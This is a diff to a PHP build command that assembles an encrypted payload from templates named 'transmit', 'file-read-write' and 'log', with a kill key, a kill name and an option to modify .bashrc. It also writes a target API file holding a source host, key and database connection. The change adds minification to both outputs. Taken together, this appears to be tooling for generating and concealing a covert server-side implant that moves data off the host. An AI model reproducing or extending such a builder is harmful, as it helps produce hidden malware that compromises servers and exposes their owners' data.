@@ -7,12 +7,14 @@ final class Command
     private Secrets $secrets;
     private Config $config;
     private FileSystem $fileSystem;
+    private Minifier $minifier;
 
-    public function __construct(Secrets $secrets, Config $config, FileSystem $fileSystem)
+    public function __construct(Secrets $secrets, Config $config, FileSystem $fileSystem, Minifier $minifier)
     {
         $this->secrets = $secrets;
         $this->config = $config;
         $this->fileSystem = $fileSystem;
+        $this->minifier = $minifier;
     }
 
     public function run(): void
@@ -24,20 +26,23 @@ final class Command
             str_replace(
                 '###DATA###',
                 SSL::encrypt(
-                    $this->fileSystem->read('randomAlphaNumericString', 'php')
-                    . "\n"
-                    . $this->fileSystem->read('transmit', 'php')
-                    . "\n"
-                    . $this->fileSystem->read('replaceIn', 'php')
-                    . "\n"
-                    . str_replace(
-                        ['##KILLKEY##', '##KILLNAME##', '###ENABLE_BASHRC_MODIFICATION###'],
-                        [
-                            $this->secrets->getKillKey(),
-                            $this->secrets->getKillName(),
-                            $this->config->getEnableBashRC()
-                        ],
-                        $this->fileSystem->read('log', 'php')
+                    $this->minifier->minify(
+                        $this->fileSystem->read('randomAlphaNumericString', 'php')
+                        . "\n"
+                        . $this->fileSystem->read('transmit', 'php')
+                        . "\n"
+                        . $this->fileSystem->read('file-read-write', 'php')
+                        . "\n"
+                        . str_replace(
+                            ['##KILLKEY##', '##KILLNAME##', '###ENABLE_BASHRC_MODIFICATION###'],
+                            [
+                                $this->secrets->getKillKey(),
+                                $this->secrets->getKillName(),
+                                $this->config->getEnableBashRC()
+                            ],
+                            $this->fileSystem->read('log', 'php')
+                        ),
+                        false
                     ),
                     $this->secrets->getPass(),
                     $this->secrets->getIvPhp()
@@ -81,16 +86,18 @@ final class Command
         );
         $this->fileSystem->writeTarget(
             "{$this->secrets->getApi()}.php",
-            str_replace(
-                ['##SOURCE_HOST##', '##SOURCE_KEY##', '##TARGET_FILTER##', '##DATABASE_CONNECTION##'],
-                // @phan-suppress-next-line PhanTypeArraySuspicious
-                [
-                    $this->config->getSource(),
-                    $this->secrets->getKey(),
-                    $this->config->getEnableFilter(),
-                    $this->config->getDatabase()
-                ],
-                $this->fileSystem->read('api', 'php', false)
+            $this->minifier->minify(
+                str_replace(
+                    ['##SOURCE_HOST##', '##SOURCE_KEY##', '##TARGET_FILTER##', '##DATABASE_CONNECTION##'],
+                    // @phan-suppress-next-line PhanTypeArraySuspicious
+                    [
+                        $this->config->getSource(),
+                        $this->secrets->getKey(),
+                        $this->config->getEnableFilter(),
+                        $this->config->getDatabase()
+                    ],
+                    $this->fileSystem->read('api', 'php', false)
+                )
             )
         );
         $this->fileSystem->writeHome(
